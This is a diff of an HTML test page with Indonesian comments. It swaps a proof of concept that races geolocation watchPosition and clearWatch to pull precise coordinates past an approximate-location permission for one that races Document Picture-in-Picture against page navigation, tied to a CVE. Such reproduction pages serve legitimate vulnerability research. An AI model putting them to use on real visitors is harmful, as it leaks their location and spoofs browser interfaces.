@@ -1,64 +1,54 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Geo Precision Leak Test</title></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Doc-PiP Async Race Test</title>
+</head>
 <body>
-<p>Status: <span id="status">Menunggu izin lokasi...</span></p>
-<pre id="output"></pre>
+    <p>Status: <span id="status">Siap. Klik tombol untuk memulai pengujian.</span></p>
+    <button id="startBtn">Mulai Pengujian Race</button>
 
-<script>
-(async function() {
-    const statusEl = document.getElementById('status');
-    const outputEl = document.getElementById('output');
+    <script>
+    (function() {
+        const statusEl = document.getElementById('status');
+        const startBtn = document.getElementById('startBtn');
 
-    // Minta izin lokasi (pengguna harus memilih "Perkiraan/Approximate")
-    try {
-        const perm = await navigator.permissions.query({ name: 'geolocation' });
-        statusEl.textContent = `Status izin: ${perm.state}`;
-    } catch(e) {
-        statusEl.textContent = 'Kueri izin gagal: ' + e.message;
-        return;
-    }
+        // Video sangat pendek untuk memenuhi persyaratan pemutaran media PiP
+        const video = document.createElement('video');
+        video.src = 'data:video/mp4;base64,...'; // Harus diganti dengan base64 video yang valid
+        video.muted = true;
+        video.playsInline = true;
+        video.loop = true;
+        video.style.width = '100px';
+        document.body.appendChild(video);
 
-    let leaked = false;
+        async function triggerRace() {
+            statusEl.textContent = 'Meminta jendela Document PiP...';
 
-    // Inti: rapid toggle watchPosition/clearWatch, mengenai race condition jendela state
-    function rapidToggle() {
-        if (leaked) return;
-        const id = navigator.geolocation.watchPosition(
-            (pos) => {
-                const acc = pos.coords.accuracy;
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+            try {
+                // Inti: meminta Document PiP (memerlukan gesture pengguna, yaitu klik tombol)
+                const pipWindow = await documentPictureInPicture.requestWindow({
+                    width: 320,
+                    height: 240
+                });
 
-                outputEl.textContent += 
-                    `lat=${lat.toFixed(6)}, lon=${lon.toFixed(6)}, accuracy=${acc.toFixed(1)}m\n`;
+                statusEl.textContent = 'Jendela PiP berhasil dibuka, segera melakukan navigasi...';
 
-                // Jika accuracy sangat kecil (misalnya < 100m), kemungkinan besar koordinat presisi
-                if (acc < 100 && !leaked) {
-                    leaked = true;
-                    statusEl.textContent = 'Kebocoran terdeteksi: menerima koordinat presisi (accuracy < 100m)';
-                }
-            },
-            (err) => { /* abaikan error, lanjutkan toggle */ },
-            { enableHighAccuracy: false, maximumAge: 0, timeout: 5000 }
-        );
+                // Race condition: segera navigasi setelah PiP terbuka
+                // Pada versi yang rentan, observer belum terdaftar, navigasi terlewat,
+                // sehingga PiP tetap ada dan menampilkan sumber yang salah.
+                window.location.href = 'https://www.google.com';
 
-        // Cepat bersihkan, lalu picu lagi
-        setTimeout(() => {
-            navigator.geolocation.clearWatch(id);
-            if (!leaked) setTimeout(rapidToggle, 10); // interval sangat pendek
-        }, 20);
-    }
+            } catch (e) {
+                statusEl.textContent = 'Document PiP gagal: ' + e.message;
+                // Jika Document PiP tidak didukung, fallback ke video PiP biasa
+                // (CVE ini terutama untuk Document PiP, tetapi video PiP mungkin memiliki perilaku serupa)
+            }
+        }
 
-    // Mulai setelah interaksi pengguna (beberapa browser memerlukan gesture)
-    document.body.addEventListener('click', function start() {
-        statusEl.textContent = 'Menguji... (pastikan perangkat memiliki izin lokasi presisi dan aplikasi lain sedang menggunakan lokasi)';
-        rapidToggle();
-        document.body.removeEventListener('click', start);
-    }, { once: true });
-
-    statusEl.textContent = 'Klik halaman untuk memulai pengujian';
-})();
-</script>
+        startBtn.addEventListener('click', triggerRace, { once: true });
+    })();
+    </script>
 </body>
 </html>
